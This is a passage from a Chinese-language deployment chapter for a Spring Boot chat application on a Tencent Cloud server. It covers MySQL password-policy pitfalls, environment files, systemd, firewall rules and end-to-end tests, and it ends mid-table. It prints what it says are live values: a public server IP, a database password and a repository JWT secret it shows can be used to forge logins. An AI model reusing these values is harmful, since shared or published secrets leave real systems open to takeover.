| 日志 | 控制台 + 满屏 SQL（dev 配了 `StdOutImpl`） | 文件 + journald，**没有 SQL** |
| 环境变量 | 靠 IntelliJ Run Configuration | 靠 `chatroom.env`（**这才是最容易出错的地方**，见第 15 章阶段 3） |

> **"本地好好的、线上就是不对"的九成原因在最后一行。** 所以第 15 章里专门花了很大篇幅讲 `chatroom.env`。

---

## 第 15 章 · 部署上线全流程（8 个阶段）

> 这一章是全书**最长也最"可照抄"**的一章。原始手册有 5 万多字（8 个阶段 + 5 个附录 + 完整排查记录），
> 这里做了压缩，但**每一个坑、每一条验证命令都保留**。
>
> 服务器规格：**腾讯云轻量应用服务器**，实例名 `Hermes Agent1`，系统 **OpenCloudOS 9**（RHEL 9 系）。
> 目标：`http://<公网IP>:8082/login.html` 能打开，能登录、能双人实时聊天。

> ⚠️ **发布前必读：本文里的公网 IP、实例名、数据库账号密码都是作者这台测试机的真实值。**
> 如果你要把这篇发到网上，**先把它们全部替换成占位符**（`<公网IP>` / `<实例名>` / `<你的密码>`）。
> 另外，**别抄本文的密码去用** —— 它们已经在作者的机器上用了，抄了等于共用密码。
> `JWT_SECRET` 同理：**每一台机器都必须自己 `openssl rand -base64 48` 生成一份**，绝不能多机共用。

### 15.0 三条排查口诀（比任何一条命令都值钱）

部署 90% 的时间花在"排不出来"，所以先把**判断框架**建立起来。

**第一步：不管哪一层出问题，先在服务器上跑这一条，把问题一分为二。**

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8082/login.html
```

- 返回 `200` → **应用是好的，问题一定在防火墙**
- 连不上 → **问题在应用或数据库，别去动防火墙**

**第二步：看现象定性。**

| 现象 | 含义 | 该查哪里 |
|---|---|---|
| **连接超时**（转圈到超时） | 包被防火墙丢了 | 腾讯云「防火墙」/ 服务器 `firewalld` |
| **连接被拒绝**（Connection refused） | 包到了，但没人监听 | 应用没起来 → `systemctl status chatroom` |
| **能开页面但请求报错** | 链路通了，应用/DB 有问题 | `journalctl -u chatroom -n 100` |

> 🔴 **"连接超时"和"连接被拒绝"是完全不同的两个问题。**
> 前者是"路不通"，后者是"路通了但没人在"。**搞混这两个会在完全错误的方向上花掉一整天。**

### 15.0.1 环境实况（先核实，别假设）

| 项 | 值 | 为什么要确认 |
|---|---|---|
| 产品形态 | **轻量应用服务器**（不是 CVM） | → 放行端口的入口叫「**防火墙**」，CVM 那套叫「安全组」，**找错地方永远找不到** |
| 系统 | **OpenCloudOS 9**（RHEL 9 系） | → 用 **`dnf`**，不是 `apt` |
| 公网 IP | `101.42.2.204` | ⚠️ 平台 NAT 映射出来的 |
| 内网 IP | `10.2.0.8` | ⚠️ **服务器上 `ip addr` 看不到公网 IP** |
| 到期时间 | `2026-10-08` | 🔴 **先去续费，别测到一半停机** |
| JDK 17 | 已装 | 阶段 1 可跳过 |
| MySQL | 已装，`mysqld.service` 已 enabled | 是否在运行待确认 |
| `firewalld` | 🔴 **根本没装** | → "两道门"只剩腾讯云防火墙一道 |

**关于内网 IP 的那个警告为什么重要：**

Spring Boot 默认监听 `0.0.0.0`，**不用改**。

⚠️ **千万别去绑 `101.42.2.204`** —— 本机根本没有这个地址（公网 IP 是平台 NAT 出来的），绑了会**直接起不来**，报 `Cannot assign requested address`。

### 15.1 阶段 1 · 服务器环境确认

#### 1.1 一条命令看清 MySQL 现状

```bash
echo "== 1. 版本（区分 MySQL 8 / MariaDB）=="; mysql --version
echo; echo "== 2. 服务状态 =="; echo -n "is-active: "; systemctl is-active mysqld; echo -n "is-enabled: "; systemctl is-enabled mysqld
echo; echo "== 3. 3306 在监听吗 =="; ss -lntp 2>/dev/null | grep 3306 || echo "3306 没有监听"
echo; echo "== 4. 数据目录 =="; ls /var/lib/mysql 2>/dev/null | head -5 || echo "数据目录还不存在（从没启动过）"
echo; echo "== 5. 初始临时密码 =="; grep -i 'temporary password' /var/log/mysqld.log 2>/dev/null || echo "日志里没有临时密码"
```

**为什么要确认"MySQL 还是 MariaDB"？** 因为两者 root 的初始认证方式不同：

| | 初始登录 | 应用侧 |
|---|---|---|
| MySQL 8 | `mysql -uroot -p`（日志里有临时密码） | `com.mysql.cj.jdbc.Driver` |
| MariaDB 10.x | `mysql -uroot` 直接进（走 `unix_socket` 认证） | **同一个驱动也能连 MariaDB 10.5+，代码零改动** |

**情况分支：**

| 情况 | 处理 |
|---|---|
| `is-active: active` 且有临时密码 | `mysql -uroot -p` 粘贴密码 → 先 `ALTER USER 'root'@'localhost' IDENTIFIED BY '新密码'; FLUSH PRIVILEGES;`（**MySQL 8 的临时密码处于"已过期"状态，不换掉会拦着你做别的事**） |
| `is-active: inactive` | `systemctl start mysqld` → 再回上一种情况 |
| `active` 但日志没密码 | 可能是 `--initialize-insecure` 装的（root 空密码）→ `mysql -uroot -e "select version();"` 能进就是空密码；进不去就看 `journalctl -u mysqld \| grep -i password` |

#### 1.2 🔴 生成本次部署专用的 JWT 密钥

```bash
openssl rand -base64 48
```

**把这串记下来，阶段 3 要用。**

**为什么必须换？**

`application.yml` 里现在的默认值 `${JWT_SECRET:+JEq/o2bYDEtaECkxKCeAt0i3yA0IPUlV2rxFVGS+v4=}` 是**公开在代码仓库里的**。

`jwt.secret` 是 HMAC 签名密钥，服务端只用它**验签**、不看别的。所以：

> **密钥公开 = 任何人手搓一个 `{"userId":4}` 的 token，就能冒充 `wangwu` 登录。**
>
> 这不是"理论风险"：JWT 的 payload 是**明文 Base64**，签名算法是公开的。
> 知道密钥的人可以用 5 行代码伪造出任意用户的 token。

#### ✅ 阶段 1 通过标准

- 知道 `mysql --version` 输出的是 MySQL 还是 MariaDB
- 能成功 `mysql -uroot -p` 登进去
- 手里有一串 `openssl rand -base64 48` 的输出

### 15.2 阶段 2 · 初始化数据库

#### 2.1 🔴 先避开 MySQL 8 密码策略的两个坑

**坑 1：`policy = MEDIUM` 要求特殊字符**

OpenCloudOS / RHEL 系的 `mysql-server` 包**默认装并启用了 `validate_password` 插件**。实测：

| 参数 | 值 | 含义 |
|---|---|---|
| `policy` | `MEDIUM` | 下面几条都要满足 |
| `length` | 8 | 长度 ≥ 8 |
| `mixed_case_count` | 1 | 至少 1 个大写 + 1 个小写 |
| `number_count` | 1 | 至少 1 个数字 |
| `special_char_count` | 1 | 至少 1 个**特殊字符** |
| `check_user_name` | **ON** | **密码里不能包含用户名** |

纯字母数字的密码会被拒绝：

```
ERROR 1819 (HY000): Your password does not satisfy the current policy requirements
```

**🔴 这个错误的欺骗性极强。**

如果你用 `mysql -e "ALTER USER ..."` 执行，在滚动很快的终端里很容易**没看到这行报错**，于是误以为"改成功了"，接着每次登录都拿到：

```
ERROR 1045 (HY000): Access denied for user 'root'@'localhost'
```

然后你开始怀疑"密码抄错了"，在完全错误的方向上花很久。

> **`1045` 是结果，`1819` 才是原因。**
> 通用教训：**看到 `Access denied` 先往上翻，找有没有被漏掉的策略类报错。**

**坑 2：`check_user_name = ON` 会拒绝"含用户名"的密码**

用户名是 `chatroom`，所以密码里**不能出现 `chatroom`**（大小写不敏感）。

所以 `ChatroomTest2026@Ok` 会被拒 → 最终用的是 `AppDb2026@Ok`。

**🔴 特殊字符只选温和的 `@`。**

这个密码要穿过 **shell → sed → SQL → systemd EnvironmentFile** 四层解析：

| 字符 | 在哪一层出事 |
|---|---|
| `#` | shell / systemd 当**注释** |
| `$` | shell 会**变量展开** |
| `&` | shell 当**放后台**；sed 替换串里有特殊含义 |
| 引号 | 四层各有各的配对规则，**最容易打架** |
| **`@`** | **四层里都是普通字符** ✅ |

**结论：`@` 既满足策略要求，又不用跟任何一层的转义规则搏斗。**

> 这条经验可以推广：**任何要穿过多层解析的字符串（密码、URL、正则），都优先选"在各层都没有特殊含义"的字符。**

#### 2.2 执行建库脚本

```bash
# ① 传上去
scp "E:/JavaEE-learn/web-chatroom/chatroom/deploy/db_init.sql" root@101.42.2.204:/tmp/

# ② 替换占位符（[^']* 匹配到下一个单引号为止，不碰中文，避免编码问题）
sed -i "s/CHANGE_ME[^']*/AppDb2026@Ok/" /tmp/db_init.sql

# ③ 确认替换成功 —— 必须看到明文的密码
grep -n "identified by" /tmp/db_init.sql

# ④ 执行（--default-character-set=utf8mb4 是防中文注释乱码）
mysql --default-character-set=utf8mb4 -uroot -p < /tmp/db_init.sql
```

**第 ③ 步的输出应该是：**

```
80:create user if not exists 'chatroom'@'localhost' identified by 'AppDb2026@Ok';
```

**看到 `CHANGE_ME` 还在就说明第 ② 步没生效，别往下走。**

> ⚠️ **忘了改占位符的后果**：脚本照样"成功"，但账号密码就是那一串占位符。
> 后面应用连不上报 `Access denied`，而你会以为是别的配置写错了 —— **这类问题最难查。**

**关于 `sed` 的 `[^']*`：** 用它匹配"到下一个单引号为止"，而不是写 `CHANGE_ME_改成强密码`。

因为占位符里有**中文**。不同环境的 locale / 编码设置下，sed 匹配中文可能失败。用"非单引号字符"这个**与内容无关**的模式，就绕开了编码问题。

#### 2.3 核对脚本自带的输出

脚本末尾**自带自检节**，会直接打印结果，不用另敲命令：

| 检查项 | 期望值 |
|---|---|
| 表清单 | **6 张**：user / friend / add_friend_request / message_session / message_session_user / message |
| 用户 | `wangwu`、`xiaodudu`，`pwd_len` **都是 64** |
| 好友关系 | 2 条（互为好友） |
| 应用账号权限 | `GRANT SELECT, INSERT, UPDATE, DELETE ON java_chatroom.* TO chatroom@localhost` |

> `pwd_len` 不是 64 说明**密文被截断了**（列宽不够）—— **先别往下走**，改完表结构重来。
> 这里验的就是第 4.4 章"MD5 32 位 + 盐 32 位 = 64 位，列必须 varchar(64)"。

**关于应用账号的权限：**

只授予 4 个 **DML** 权限（SELECT / INSERT / UPDATE / DELETE），**不给 DDL**（CREATE / DROP / ALTER）。

这是**最小权限原则**：应用只需要读写数据，不需要改表结构。万一应用被攻破（比如存在一个 SQL 注入点），攻击者**也无法 `DROP TABLE`**。

#### ✅ 阶段 2 通过标准

- 6 张表齐全
- `pwd_len = 64`
- `chatroom` 账号只有 4 个 DML 权限（没有 DDL）

### 15.3 阶段 3 · 上传应用与配置

#### 3.1 建系统账号和目录

```bash
# 建一个不能登录的系统账号来跑 Java 进程（别用 root 跑）
useradd -r -s /sbin/nologin chatroom

mkdir -p /opt/chatroom/upload /opt/chatroom/logs
chown -R chatroom:chatroom /opt/chatroom
chmod 755 /opt/chatroom
```

**两个决策的理由：**

**① 为什么用 `chatroom` 用户而不是 root？**

万一应用被攻破（RCE），攻击者拿到的是 `chatroom` 用户的权限 —— **动不了系统文件、改不了别的服务**。用 root 跑就是直接把整台机器交出去。

**② 为什么要手工建 upload / logs 目录？**

应用其实会自己建（`FileStorageServiceImpl` 构造时 `Files.createDirectories`、logback 也会建父目录），**所以不建也能跑**。

**先建是为了"把属主定好"。** 如果让 root 身份先启动一次把目录建出来 → 目录属主是 root → 之后换成 `chatroom` 用户就**写不进去**。

> **"权限拒绝"比"目录不存在"难看出原因得多。** 所以宁可多一条 `mkdir`，把属主一开始就定对。

#### 3.2 传 jar

```bash
scp "E:/JavaEE-learn/web-chatroom/chatroom/target/web-chatroom-0.0.1-SNAPSHOT.jar" \
    root@101.42.2.204:/opt/chatroom/app.jar

chown chatroom:chatroom /opt/chatroom/app.jar
```

#### 3.3 🔴 写环境变量文件（全章最容易出错的一步）

```bash
cat > /opt/chatroom/chatroom.env <<'EOF'
SPRING_PROFILES_ACTIVE=prod
SERVER_PORT=8082
DB_USERNAME=chatroom
DB_PASSWORD="阶段2给 chatroom 账号设的那个密码"
JWT_SECRET="阶段1 openssl 出来的那串"
UPLOAD_DIR=/opt/chatroom/upload
LOGGING_FILE_NAME=/opt/chatroom/logs/chatroom.log
SPRING_DATASOURCE_URL='jdbc:mysql://127.0.0.1:3306/java_chatroom?characterEncoding=utf8&useSSL=false&allowPublicKeyRetrieval=true'
EOF

chmod 600 /opt/chatroom/chatroom.env
chown chatroom:chatroom /opt/chatroom/chatroom.env
```

**逐条说明：**

| 变量 | 为什么 |
|---|---|
| `SPRING_PROFILES_ACTIVE=prod` | 🔴 **dev 会把静态资源指到 `file:src/main/resources/static/`** —— 而 **jar 里没有这个路径**，会静态资源全 404。prod 下从 jar 内 classpath 读，才对 |
| `SERVER_PORT=8082` | 显式写出来，避免以后改 yml 时端口搞乱。**8082 的来由见 15.8 附录** |
| `DB_USERNAME` / `DB_PASSWORD` | 必须换掉仓库默认值 |
| `JWT_SECRET` | 必须换掉仓库默认值（理由见 1.2） |
| `UPLOAD_DIR` | 用**绝对路径**，别依赖工作目录 |
| `LOGGING_FILE_NAME` | 覆盖 `application.yml` 里的相对路径，落到绝对位置 |
| `SPRING_DATASOURCE_URL` | ★ **见下方，这是防一个必踩的坑** |

> **`SPRING_PROFILES_ACTIVE=prod` 而项目没有 `application-prod.yml`，这不是问题** —— Spring Boot 找不到该 profile 的配置文件只是"不叠加额外配置"，不会报错。

**🔴 `SPRING_DATASOURCE_URL` 那行必须用引号包起来**

因为阶段 4 的 `set -a; . ./chatroom.env; set +a` 是**用 shell 执行这个文件**，而 shell 把 **`&` 当成"放后台"的控制符**。

不写引号的话：

```
SPRING_DATASOURCE_URL=jdbc:mysql://...?characterEncoding=utf8&useSSL=false&allowPublicKeyRetrieval=true
```

会被 shell 拆成 **3 条后台任务**：

- `SPRING_DATASOURCE_URL=jdbc:mysql://...?characterEncoding=utf8` —— **在子 shell 里设的，传不出来**
- `useSSL=false`（后台任务 2）
- `allowPublicKeyRetrieval=true`（后台任务 3）

**结果：这个变量根本没生效。** 应用会退回 `application.yml` 里那条**不带 `allowPublicKeyRetrieval` 的默认 URL** → 第一次真连数据库就报下面的坑。

**而且症状很隐蔽**：屏幕上只会多出一行 `[2]+ Done  useSSL=false`，不仔细看根本不会发现。

**所以：用单引号 `'...'` 包起来。** systemd 的 `EnvironmentFile` 同样认单引号（会自动剥掉），所以加引号对两边都安全 —— **加了就没风险**。

**🔴 为什么必须覆盖整条 `SPRING_DATASOURCE_URL`？**

MySQL 8 默认认证插件是 `caching_sha2_password`。它配合 `application.yml` 里的 `useSSL=false` 时，客户端需要**向服务端索取 RSA 公钥**来加密密码，而 **mysql-connector-j 默认禁止这件事** → 报：

```
Public Key Retrieval is not allowed
```

**要命的是连接池把这个错误包装成了 `Communications link failure`。**

于是你会误判成"MySQL 没起"或"密码错"，在这两个方向上白费半天。

| 方案 | 结论 |
|---|---|
| 把账号改成 `identified with mysql_native_password` | ❌ **MySQL 8.4 起该插件默认已不可用**，等于把自己绑死在旧版本 |
| URL 上加 `allowPublicKeyRetrieval=true` | ✅ **正解** |
| 需要重新打包吗 | ✅ **不用** —— 环境变量优先级高于 yml，改 env 文件即可 |

**⚠️ 绝对不要用 `--spring.config.additional-location=...chatroom.env`**

这个参数只认 **`.properties` / `.yml` / `.yaml`** 扩展名。

- `chatroom.env` 是 shell 变量文件，Spring 读到不认识的扩展名会**直接报错退出**
- 就算侥幸读进去了，`SPRING_PROFILES_ACTIVE=prod` 这种"全大写下划线"的键**也不会被解析成 `spring.profiles.active`** —— 那是**环境变量的宽松绑定规则**，普通配置文件不支持

**正确姿势只有一种：用 shell 把它 source 进环境，再以 `chatroom` 用户启动**（阶段 4）。

#### ✅ 阶段 3 通过标准

```bash
ls -l /opt/chatroom    # app.jar / chatroom.env(600) / upload / logs，属主都是 chatroom
```

### 15.4 阶段 4 · 前台试运行

**别急着配 systemd。** 先用前台方式跑起来，把报错看清楚 —— systemd 会把 stdout 收进 journald，看着更麻烦。

```bash
cd /opt/chatroom

# ① 先看文件里有哪些键（值都打成 ***，避免密码上屏）
sed 's/=.*/=***/' chatroom.env

# ② 载入环境变量（-a = 所有赋值的变量都 export）
set -a; . ./chatroom.env; set +a

# ③ 立刻验三个最关键的变量 —— 一条命令同时抓"& 拆行"和"profile 没生效"
echo "profile=$SPRING_PROFILES_ACTIVE  端口=$SERVER_PORT  用户=$DB_USERNAME  上传=$UPLOAD_DIR"

# ④ ★ 确认环境变量真的能过到 chatroom 用户（只打键名，不打值）
echo "--- chatroom 用户实际能看到的键： ---"
sudo -u chatroom env \
  | grep -oE '^(SPRING_PROFILES_ACTIVE|SERVER_PORT|DB_USERNAME|DB_PASSWORD|JWT_SECRET|UPLOAD_DIR|LOGGING_FILE_NAME|SPRING_DATASOURCE_URL)=' \
  || echo "❌ 一个都没有 —— 环境被 sudo 清掉了"

# ⑤ 启动（-E = 保留当前环境变量）
sudo -E -u chatroom java -jar app.jar
```

#### 🔴 第 ② 步不该打印任何 `[1]+ Done ...` / `[1]+ Exit ...`

一旦出现（例如 `[2]+  Done                    useSSL=false`），说明 `chatroom.env` 里有**没加引号的值含 `&`**，那个变量等于没设 → 回 3.3 看说明。

#### 🔴 第 ③ 步必须原样打印

```
profile=prod  端口=8082  用户=chatroom  上传=/opt/chatroom/upload
```

少任何一个都别继续往下走，先把 env 文件修好。

#### 🔴🔴 `sudo` 默认会把环境变量清空！必须加 `-E`

`sudo` 的默认配置是 **`env_reset`**，它只保留 `LANG` / `TERM` / `LC_*` / `DISPLAY` / `PS1` 这类，**像 `SPRING_PROFILES_ACTIVE`、`DB_PASSWORD`、`JWT_SECRET` 这些自定义变量全部被丢掉。**

**症状非常隐蔽：程序照样起来，只是"悄悄用回了默认值"：**

| 环境变量丢失后 | 实际生效的值 | 后果 |
|---|---|---|
| `SPRING_PROFILES_ACTIVE` | `application.yml` 的默认值 **`dev`** | 静态资源全 404 |
| `DB_USERNAME` / `DB_PASSWORD` | 默认 **`root`** / 仓库里公开的密码 | 连不上库 / 用弱密码 |
| `SPRING_DATASOURCE_URL` | 退回**不带 `allowPublicKeyRetrieval`** 的那条 | 连库报错 |
| `JWT_SECRET` | 退回仓库默认值 | 🔴 **等于 JWT 密钥公开，谁都能伪造登录态** |

**判定方法**：看启动日志那行

```
The following 1 profile is active: "xxx"
```

**应该是 `"prod"`，打出 `"dev"` 就说明环境变量没进来。**

> ⚠️ **别拿 `上传根目录：/opt/chatroom/upload` 当证据。** 工作目录正好是 `/opt/chatroom`，
> 默认值 `./upload` 解析出来就是它，**纯属巧合**。日志路径同理。
>
> **通用教训：验证时要选"默认值和目标值必然不同"的指标。** profile 满足这个条件（dev ≠ prod），
> 而路径不满足 —— 因为工作目录恰好对了。

**三种写法（越往下越稳）：**

```bash
sudo -E -u chatroom java -jar app.jar            # ① 加 -E 保留环境（最简洁）
runuser -u chatroom -- java -jar app.jar         # ② runuser 是给 root 用的，默认就保留环境
sudo -u chatroom bash -c 'set -a; . /opt/chatroom/chatroom.env; set +a; cd /opt/chatroom && java -jar app.jar'   # ③ 换用户后自己再读一遍 env
```

- ① 若报 `sudo: sorry, you are not allowed to preserve the environment`，就用 ②
- ③ 最不依赖 sudo 配置（文件是 `600 chatroom:chatroom`，chatroom 自己读得到）

> **systemd 那套没有这个问题** —— `EnvironmentFile=` 是 systemd 自己去设置环境，不经 sudo。

#### 期望看到这 4 行

```
The following 1 profile is active: "prod"
上传根目录：/opt/chatroom/upload          ← 确认路径没跑偏
Tomcat started on port 8082 (http)
Started ChatroomApplication in x.xxx seconds
```

**🔴 日志里不该出现这一行：**

```
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
```

它是 MyBatis 把 SQL 打到控制台的开关，**只配在 `application-dev.yml` 里** —— 出现就说明激活的是 dev，不是 prod。

```bash
# 快速确认（-a 是因为日志可能是 GBK，会被当成二进制文件）
grep -a -m1 'profile is active' /opt/chatroom/logs/chatroom.log
```

另开一个终端验证：

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8082/login.html    # 期望 200
ss -lntp | grep 8082
```

回到前台窗口按 `Ctrl+C` 停掉。

#### 起不来的话看这里

| 报错 | 原因 |
|---|---|
| `Communications link failure` | MySQL 没起、账号密码错、**或漏了 `allowPublicKeyRetrieval`**（先看第 ③ 步的 URL 有没有生效） |
| `Access denied for user 'chatroom'@'127.0.0.1'` | 账号只建了 `@localhost` |
| `Unknown database 'java_chatroom'` | 阶段 2 没跑 |
| `Permission denied` / `Read-only file system` | 目录属主不对，回 3.1 |
| `Port 8082 was already in use` | 被别人占了 → `ss -lntp \| grep 8082` 看是谁（见 15.8） |
| `Unrecognized file extension` / 启动即退 | 用错了 `--spring.config.additional-location=...chatroom.env` |
| 日志出现 `StdOutImpl` 或 `profile is active: "dev"` | 🔴 **环境变量没进到进程里** —— 最常见就是 `sudo` 少了 `-E` |

#### ✅ 阶段 4 通过标准

- 第 ② 步**没有**后台任务提示
- 第 ③ 步四个变量都非空
- **第 ④ 步 8 个键都列出来了**（列出来的数量 = 传过去的数量）
- 启动日志出现上面 4 行，其中 `profile is active: "prod"`，且**没有** `StdOutImpl`
- 本机 `curl` 返回 **200**
- `Ctrl+C` 能干净退出

### 15.5 阶段 5 · 交给 systemd 托管

```bash
cat > /etc/systemd/system/chatroom.service <<'EOF'
[Unit]
Description=web-chatroom
After=network-online.target mysqld.service
Wants=network-online.target

[Service]
Type=simple
User=chatroom
Group=chatroom
WorkingDirectory=/opt/chatroom
EnvironmentFile=/opt/chatroom/chatroom.env
ExecStart=/usr/bin/java -Xms256m -Xmx512m -XX:+UseG1GC -jar /opt/chatroom/app.jar
SuccessExitStatus=143
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now chatroom
systemctl status chatroom --no-pager
```

**四个关键点：**

| 配置 | 为什么 |
|---|---|
| **`SuccessExitStatus=143`** | **143 = 128 + 15 = SIGTERM**。`systemctl stop` 发的正是 SIGTERM，JVM 就以 143 退出。**不写这行，正常停服务会显示 `failed`** —— 非常误导（你会以为服务崩了） |
| `Restart=always` + `RestartSec=5` | 进程崩了 5 秒后自动拉起 = **崩溃自愈** |
| `EnvironmentFile` | 一行一个 `KEY=value`，**不认 shell 语法**（不能 `export`、不能 `$(...)`） |
| `enable` | = **开机自启**。这才是 systemd 相比 `nohup java -jar &` 的全部价值 |

**看日志：**

```bash
journalctl -u chatroom -f                 # 实时跟随
journalctl -u chatroom -n 100 --no-pager  # 最近 100 行
tail -f /opt/chatroom/logs/chatroom.log   # logback 那份
```

> `journalctl` 搜**中文**关键字匹配不到，**用类名或英文关键字搜**（如 `OnlineUserManager`、`Tomcat`）。

#### 🔴 验证它真的"脱离终端"了（这一步别省）

**为什么必须验：** 前台跑的进程和终端绑在一起 —— **SSH 一断，终端消失，系统就给进程发 `SIGHUP`，进程就死了。**

而 **systemd 起来的进程没有控制终端**，所以跟你的电脑开不开机、窗口关不关**完全无关**。

```bash
PID=$(systemctl show -p MainPID --value chatroom)
ps -o pid,ppid,tty,sid,cmd -p "$PID"
```

**期望看到两个特征：**

| 字段 | 期望值 | 含义 |
|---|---|---|
| `TTY` | **`?`** | **没有控制终端** → 不归任何 SSH 会话管 |
| `PPID` | **`1`** | 父进程是 init/systemd，**不是你的 shell** |

**这就是"关掉窗口它也不会死"的铁证。**

再做一个实证：**关掉当前 SSH 窗口，重新开一个**，然后

```bash
systemctl status chatroom --no-pager | head -4                            # 仍应 active (running)
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8082/login.html  # 仍应 200
```

**终极验证（推荐做一次）：直接重启服务器**

```bash
systemctl is-enabled mysqld chatroom          # ① 两个都要是 enabled
reboot                                        # ② 重启
# ③ 等 1 分钟重连 SSH
systemctl status chatroom --no-pager | head -4
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8082/login.html
```

> ⚠️ **`mysqld` 也必须 `enabled`** —— 否则服务器重启后 MySQL 没起，应用虽然还能启动，但**任何请求都会连库失败**。
> **这两个的开机自启要一起确认。**

#### 日常只需要记这 4 条命令

```bash
systemctl status chatroom      # 现在活着吗
systemctl restart chatroom     # 重启（换 jar / 改 env 之后用）
journalctl -u chatroom -f      # 实时看日志（Ctrl+C 只是退出查看，不会停服务）
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8082/login.html   # 自检，期望 200
```

**什么时候才需要你手动动手：** 只有"换了新 jar"和"改了 `chatroom.env`"这两种。

**服务器重启、进程崩溃、你电脑关机 / 关窗口 —— 全都不用管。**

### 15.6 阶段 6 · 放行端口 ★ 最容易卡死的一步

**为什么最容易卡死？** 因为**两道防火墙，没开的表现完全一样**（浏览器一直转圈到超时），你无法从现象判断是哪一道。

#### 门 1 · 腾讯云轻量「防火墙」

**入口**：控制台 → 轻量应用服务器 → 实例 → 标签栏里的「**防火墙**」

⚠️ 标签栏是「概要 / 域名解析 / 云硬盘 / **防火墙** / SSH密钥 / …」，**「SSH 密钥」不是「防火墙」**，别看错。

点「**添加规则**」：

| 字段 | 填什么 |
|---|---|
| 应用类型 | **自定义** |
| 来源 | `0.0.0.0/0`（下拉里等价选项是「全部IPv4地址」） |
| 协议 | **TCP** |
| 端口 | 见下表 |
| 策略 | **允许** |

**🔴 `应用类型` 下拉里没有「SSH」**（只有 自定义 / HTTP(80) / HTTPS(443) / MySQL(3306) / SQL Server(1433) / 全部TCP / 全部UDP / Ping / ALL）。

所以 **22 端口必须选「自定义」再手填**，没有现成选项。

**🔴 `端口` 框支持逗号分隔多个端口**，所以两条规则可以合成一条：填 `22,8082`。

**🔴🔴 绝对不要点这个页面上的「一键放通」** —— 它会一次放开一批常见端口，**包括 `3306` MySQL**，等于把数据库直接暴露到公网。

**而本机没装 `firewalld`（见门 2）** —— 一旦 MySQL 暴露到公网，就是**裸奔**，没有任何第二道防线。

> 这是我在整份部署手册里唯一用 **🔴🔴（双红）** 标记的地方。**手动加端口才安全。**

| 端口 | 用途 |
|---|---|
| **22** | `scp` / `ssh` 上传（33MB 的 jar 没法粘贴，必须靠它） |
| 8082 | 应用对外访问 |

**🔴 最容易误判的一点：能用腾讯云网页版终端（OrcaTerm）操作服务器 ≠ SSH 能用。**

网页终端走的是**腾讯内部通道**，完全不经过公网 22 端口。

所以"网页终端里一切正常、本地 `scp` 却 `Connection timed out`"是**很正常的情况** —— 不是网络坏了、也不是 IP 错了，而是**防火墙没放行 22**。

**排查顺序：**

1. 服务器上（网页终端里）确认 sshd 在听：`systemctl is-active sshd` + `ss -lntp | grep :22`
2. 正常 → 去控制台「防火墙」加 TCP 22
3. 加了还不通 → 本地网络（公司/校园网）可能屏蔽出网 22，用手机热点试；最终手段是把 SSH 改到 2222 端口

#### 门 2 · 服务器自己的 firewalld（本机**跳过**）

🔴 **本机实测：`firewalld` 根本没装。**

```
$ systemctl is-active firewalld
$ firewall-cmd --list-ports
bash: firewall-cmd: command not found
```

也就是说这台机器上 **"端口要过两道门"的说法只剩一道** —— 安全边界就是腾讯云控制台的「防火墙」，主机侧没有第二道。

**所以务必守住那条铁律：绝不要点「一键放通」。**

> 如果换到别的机器、那边有 firewalld，就按这个来：
>
> ```bash
> systemctl is-active firewalld
> firewall-cmd --add-port=8082/tcp --permanent
> firewall-cmd --reload
> firewall-cmd --list-ports     # 应看到 8082/tcp
> ```
>
> **别顺手 `systemctl disable firewalld`** —— 以后上 Nginx 的 80/443 还要用它，关掉等于把安全边界整个撤了。

#### 门 3 · 应用监听地址

Spring Boot 默认监听 `0.0.0.0`，**不用改**。

⚠️ **千万别去绑公网 IP** —— 本机没有这个地址（平台 NAT 出来的），绑了会直接起不来。

#### 验证

```bash
# 在本地 Windows 上
curl -v --max-time 5 http://101.42.2.204:8082/login.html
```

- `HTTP/1.1 200` → ✅ 通了
- **超时 / 卡住** → 门 1 或门 2 没开
- **Connection refused** → 门开了，但应用没在跑 → 回阶段 5

> **判断端口通没通，别只看控制台的规则表** —— 从公网 `curl` 一遍，那才是真的。

#### ✅ 阶段 6 通过标准

浏览器打开 `http://<公网IP>:8082/login.html` 能看到登录页。

### 15.7 阶段 7 · 端到端验收

#### 7.1 先验证 WebSocket 握手链路（不装任何工具）

```bash
# 服务器上执行
curl -i -N --max-time 3 \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==" \
  http://127.0.0.1:8082/ws/message
```

**期望 `HTTP/1.1 101 Switching Protocols`。**

> 这条没带 token，验的是"链路通不通"不是"鉴权对不对"。
> **返回 101 或 401 都算网络路径没问题** —— 401 说明握手请求到达了应用（被 `AuthHandshakeInterceptor` 拒了）。

#### 7.2 双人 10 项验收

**必须用无痕窗口**（`Ctrl+Shift+N`）—— 同一个浏览器两个标签页共用 `localStorage`，第二个登录会覆盖第一个的 token。

| # | 操作 | 期望 | 验的是什么 |
|---|---|---|---|
| 1 | 普通窗口登录 `wangwu` | 进聊天页 | — |
| 2 | 无痕窗口登录 `xiaodudu` | 进聊天页 | — |
| 3 | 点好友发一条文本 | **两个窗口都立刻出现（含发送者自己）** | 10.3 节"广播必须含发送者" |
| 4 | 反向发一条 | 同上 | — |
| 5 | 切到发送方看**未读红点**行为 | 正在看的会话不显示红点 | 8.4 节未读游标 |
| 6 | 发一张图片 | 对方看到图片**不是路径字符串** | `contentType` 字段没漏传 |
| 7 | 2 分钟内点撤回 | 两边都显示「撤回了一条消息」 | 9.3 节撤回 |
| 8 | 搜索刚发过的关键字 | 搜得到 | 9.4 节搜索 |
| 9 | 建群并拉另一个账号 | 被拉的人会话列表**自动出现**新群 | 11.1.2 节 `TxAfterCommit` |
| 10 | 换个头像 | 立刻生效（不刷新页面） | 11.2.5 节缓存处理 |

#### 7.3 断线重连验证

在无痕窗口按 F12 → Network → 找到 WS 连接 → 右键 `Close`；或直接在服务器上 `systemctl restart chatroom`。

**期望**：前端状态栏提示"重连中"，几秒内自动恢复并**补拉断线期间的消息**。

#### 7.4 移动端 4 条触屏项（只能真机验）

`@media (hover: none) and (pointer: coarse)` 里的规则**在桌面浏览器不生效**，所以这几条**只能在手机上验**：

| # | 操作 | 期望 |
